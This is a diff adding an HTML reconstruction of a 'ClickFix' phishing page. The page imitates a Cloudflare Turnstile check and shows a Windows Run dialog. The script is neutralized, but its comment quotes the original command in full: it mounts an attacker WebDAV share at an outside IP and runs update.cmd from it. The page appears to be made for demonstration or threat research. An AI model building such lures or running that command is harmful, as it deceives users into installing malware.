@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8"><style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#f0f0f0;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:2rem 1rem;position:relative}
+
+/* ── Cloudflare Turnstile page chrome ─────────────────────── */
+.page-title{font-size:1.4rem;color:#333;font-weight:700;margin-bottom:.2rem;display:flex;align-items:center;gap:.5rem;align-self:flex-start;max-width:500px;width:100%}
+.cf-icon{width:20px;height:20px;background:#f48120;border-radius:50%;display:inline-block}
+.page-subtitle{font-size:.85rem;color:#666;margin-bottom:1rem;align-self:flex-start;max-width:500px;width:100%}
+.turnstile{background:#fafafa;border:1px solid #d5d5d5;border-radius:4px;padding:.55rem .7rem;display:flex;align-items:center;gap:.5rem;margin-bottom:.8rem;min-width:240px;align-self:flex-start;max-width:500px}
+.spinner{width:18px;height:18px;border:2px solid rgba(0,0,0,.1);border-top-color:#555;border-radius:50%;animation:spin .8s linear infinite;flex-shrink:0}
+@keyframes spin{to{transform:rotate(360deg)}}
+.turnstile-label{font-size:.78rem;color:#555;flex:1}
+.turnstile .cf-logo{display:flex;flex-direction:column;align-items:center;margin-left:auto}
+.turnstile .cf-logo .shield{width:22px;height:22px;background:#f48120;clip-path:polygon(50% 0%,100% 25%,100% 75%,50% 100%,0% 75%,0% 25%);display:block}
+.turnstile .cf-logo span{font-size:.38rem;color:#999;margin-top:1px}
+.page-notice{font-size:.78rem;color:#888;margin-bottom:1.5rem;align-self:flex-start;max-width:500px;width:100%}
+
+/* ── Verification overlay (orange themed) ─────────────────── */
+.overlay{background:#fff;border-radius:10px;width:280px;box-shadow:0 8px 32px rgba(0,0,0,.15);overflow:hidden;position:relative}
+.overlay-header{background:#f48120;padding:.5rem .75rem;display:flex;justify-content:flex-end;align-items:center}
+.overlay-header .cf-badge{font-size:.5rem;color:rgba(255,255,255,.8);text-transform:uppercase;letter-spacing:.04em;display:flex;align-items:center;gap:.25rem}
+.overlay-header .cf-badge .shield-sm{width:14px;height:14px;background:#fff;clip-path:polygon(50% 0%,100% 25%,100% 75%,50% 100%,0% 75%,0% 25%);display:inline-block}
+.overlay-body{padding:1.2rem 1.5rem;text-align:center}
+.overlay-body p{font-size:.82rem;color:#333;margin-bottom:1rem;line-height:1.5}
+.key-row{display:flex;align-items:center;justify-content:center;gap:.4rem;margin-bottom:.8rem}
+.key-btn{background:#f48120;color:#fff;font-size:.72rem;font-weight:700;padding:.4rem .7rem;border-radius:5px;border:none}
+.key-plus{color:#999;font-size:.8rem;font-weight:700}
+.confirm-row{font-size:.78rem;color:#555;margin-bottom:.8rem;display:flex;align-items:center;justify-content:center;gap:.4rem}
+.key-outline{background:#fff;border:2px solid #ddd;color:#555;font-size:.68rem;font-weight:600;padding:.3rem .6rem;border-radius:4px}
+.btn-verify{background:#f48120;color:#fff;border:none;border-radius:5px;padding:.5rem 1.5rem;font-size:.82rem;font-weight:700;cursor:default;display:block;margin:0 auto .8rem}
+.overlay-footer{display:flex;justify-content:center;gap:1.5rem;padding-bottom:.3rem}
+.overlay-footer a{font-size:.58rem;color:#999;text-decoration:none}
+
+/* ── Windows Run dialog ───────────────────────────────────── */
+.run-dialog{background:#f0f0f0;border:1px solid #aaa;border-radius:2px;width:340px;box-shadow:2px 4px 12px rgba(0,0,0,.25);position:absolute;bottom:1.5rem;left:1rem;font-family:'Segoe UI',Tahoma,sans-serif}
+.run-title{background:linear-gradient(180deg,#f8f8f8,#e8e8e8);padding:.3rem .5rem;font-size:.68rem;color:#333;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #ccc}
+.run-title .close-btn{background:#e04040;color:#fff;border:none;font-size:.6rem;width:16px;height:16px;border-radius:2px;cursor:default;line-height:1;text-align:center}
+.run-body{padding:.6rem .75rem}
+.run-icon-row{display:flex;gap:.5rem;align-items:flex-start;margin-bottom:.5rem}
+.run-icon{width:28px;height:28px;background:#2d7dce;border-radius:3px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.run-icon svg{width:16px;height:16px}
+.run-desc{font-size:.62rem;color:#444;line-height:1.5}
+.run-input-row{display:flex;align-items:center;gap:.4rem;margin-bottom:.5rem}
+.run-label{font-size:.65rem;color:#333;flex-shrink:0}
+.run-input{flex:1;background:#fff;border:1px solid #aaa;border-radius:2px;padding:.25rem .4rem;font-size:.58rem;font-family:ui-monospace,'Consolas',monospace;color:#333;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.run-buttons{display:flex;gap:.3rem;justify-content:flex-end}
+.run-btn{background:#e8e8e8;border:1px solid #bbb;border-radius:2px;padding:.2rem .7rem;font-size:.62rem;color:#333;cursor:default}
+
+/* ── Footer ───────────────────────────────────────────────── */
+.page-footer{margin-top:auto;padding-top:2rem;text-align:center;font-size:.58rem;color:#999}
+.page-footer .ray-id{font-family:ui-monospace,monospace;letter-spacing:.02em}
+</style></head><body>
+
+<!-- Cloudflare Turnstile page chrome -->
+<div class="page-title"><span class="cf-icon"></span> happyglamper.ro</div>
+<div class="page-subtitle">Verify you are human by completing the action below.</div>
+
+<div class="turnstile">
+  <div class="spinner"></div>
+  <span class="turnstile-label">Verification required</span>
+  <div class="cf-logo"><span class="shield"></span><span>Cloudflare</span></div>
+</div>
+
+<p class="page-notice">happyglamper.ro needs to review the security of your connection before proceeding.</p>
+
+<!-- ClickFix verification overlay -->
+<div class="overlay">
+  <div class="overlay-header">
+    <div class="cf-badge"><span class="shield-sm"></span> CLOUDFLARE</div>
+  </div>
+  <div class="overlay-body">
+    <p>Press Ctrl+V to paste verification code</p>
+    <div class="key-row">
+      <span class="key-btn">Ctrl</span>
+      <span class="key-plus">+</span>
+      <span class="key-btn">V</span>
+    </div>
+    <div class="confirm-row">and confirm with <span class="key-outline">Enter</span></div>
+    <button class="btn-verify">Verify</button>
+    <div class="overlay-footer">
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+    </div>
+  </div>
+</div>
+
+<!-- Windows Run dialog showing WebDAV command -->
+<div class="run-dialog">
+  <div class="run-title">
+    <span>Uruchamianie</span>
+    <button class="close-btn">&#10005;</button>
+  </div>
+  <div class="run-body">
+    <div class="run-icon-row">
+      <div class="run-icon">
+        <svg viewBox="0 0 16 16" fill="none" stroke="#fff" stroke-width="1.5"><rect x="2" y="3" width="12" height="10" rx="1"/><path d="M2 6h12"/></svg>
+      </div>
+      <div class="run-desc">Wpisz nazwe programu, folderu, dokumentu lub zasobu internetowego, a zostanie on otwarty przez system Windows.</div>
+    </div>
+    <div class="run-input-row">
+      <span class="run-label">Otwórz:</span>
+      <div class="run-input">cmd /c net use Z: http://94.156.170[.]255/webdav /persist</div>
+    </div>
+    <div class="run-buttons">
+      <button class="run-btn">OK</button>
+      <button class="run-btn">Anuluj</button>
+      <button class="run-btn">Przeglądaj...</button>
+    </div>
+  </div>
+</div>
+
+<div class="page-footer">
+  <div class="ray-id">Ray ID: 3684e9e34f41e7a1</div>
+</div>
+
+<script>
+// NEUTRALIZED — clipboard staging removed for safe demonstration
+// Original: copies "cmd /c net use Z: http://94.156.170.255/webdav /persistent:no &&
+// Z:\update.cmd & net use Z: /delete" to clipboard on Turnstile interaction.
+// Mounts attacker WebDAV share, executes payload, cleans up.
+// This version only shows the visual lure.
+</script>
+</body></html>
